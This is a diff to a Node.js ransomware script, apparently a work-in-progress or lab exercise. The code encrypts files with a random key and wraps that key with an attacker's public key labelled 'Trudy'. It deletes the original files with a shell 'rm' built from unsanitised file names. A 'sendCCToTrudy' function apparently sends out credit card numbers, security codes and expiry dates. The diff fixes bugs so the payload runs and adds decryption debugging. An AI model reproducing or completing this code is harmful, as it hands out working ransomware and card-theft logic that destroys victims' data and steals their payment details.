@@ -23,17 +23,20 @@ var encryptedFiles = [];
 //   crypted += cipher.final('hex');
 //   return crypted;
 // }
-
-// function decrypt(text){
-//   var decipher = crypto.createDecipher(algorithm,password)
-//   var dec = decipher.update(text,'hex','utf8')
-//   dec += decipher.final('utf8');
-//   return dec;
-// }
+var secureRandom = require('secure-random-string');
+  var password = secureRandom(64);
+function decrypt(text){
+  var decipher = crypto.createDecipher(algorithm,password)
+  var dec = decipher.update(text,'hex','utf8')
+  dec += decipher.final('utf8');
+  console.log("Gotcha");
+  console.log(dec);
+  return dec;
+}
 
 function encryptFiles(files){
-	var secureRandom = require('secure-random-string');
-  var password = secureRandom(64);
+	//var secureRandom = require('secure-random-string');
+  //var password = secureRandom(64);
   var pubkey = ursa.createPublicKey(pubkeyTrudy);
   encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
   var cipher = crypto.createCipher(algorithm,password);
@@ -42,26 +45,31 @@ function encryptFiles(files){
    var input = fileStream.createReadStream(file);
    var output = fileStream.createWriteStream(file +'.lock');
    input.pipe(cipher).pipe(output);
-   ecryptedFiles.push(file +'.lock');
+   encryptedFiles.push(file +'.lock');
  });
 }
 
 function deCryptFiles(key){
-	var deCipher = crypto.createDecipher(algorithm, key);
+  var deCipher = crypto.createDecipher(algorithm, key);
 
   encryptedFiles.forEach(function(file) {
-   var input = fileStream.createReadStream(file);
-   var output = fileStream.createWriteStream(file.slice(0, -5));
-   input.pipe(deCipher).pipe(output);
+   var input = fileStream.readFileSync(file);
+console.log(input);
+   //var output = fileStream.createWriteStream(file+ '.foo');
+   //input.pipe(deCipher).pipe(output);
+   var finalOutput = decrypt(input);
+   console.log(finalOutput);
  });
 }
 
 function deleteOriginalFiles(files) {
   var sys = require('sys');
-  var exe = requre('child-process').exec;
+  var exe = require('child_process').exec;
+  var stringToEx = 'rm ';
   files.forEach(function(file) {
-   exec("rm " + file);
+   stringToEx += file;
  });
+  exe(stringToEx);
 }
 
 function sendCCToTrudy(cardNumber, backNumbers, expiryDate, zip) {
@@ -90,6 +98,10 @@ var hw = "Hello World";
 encryptFiles(files);
 deleteOriginalFiles(files);
 console.log(encryptedFiles);
+console.log('Encrypted');
+
+console.log('Encrypted DeCrypting now........\n\n\n');
+deCryptFiles(password);
 
 
 //console.log(currentPath);
